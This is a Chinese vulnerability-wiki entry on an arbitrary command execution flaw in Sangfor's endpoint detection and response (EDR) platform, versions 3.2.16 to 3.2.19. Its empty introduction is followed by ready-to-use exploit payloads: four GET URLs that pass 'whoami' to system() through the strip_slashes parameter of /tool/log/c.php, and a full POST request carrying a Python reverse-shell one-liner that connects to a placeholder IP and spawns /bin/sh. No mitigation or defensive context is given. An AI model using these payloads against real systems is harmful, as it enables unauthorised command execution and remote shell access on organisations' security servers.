深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）
=====================================================

一、漏洞简介
------------

二、漏洞影响
------------

深信服EDR 3.2.16

深信服EDR 3.2.17

深信服EDR 3.2.19

三、复现过程
------------

### payload：

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&limit=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&host=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&path=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&row=whoami

![1.png](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(一)/media/rId25.png)

### 反弹shell payload

    POST /tool/log/c.php HTTP/1.1
    Host: www.0-sec.org
    Connection: close
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
    DNT: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded;charset=utf-8
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903
    Content-Length: 256

    strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
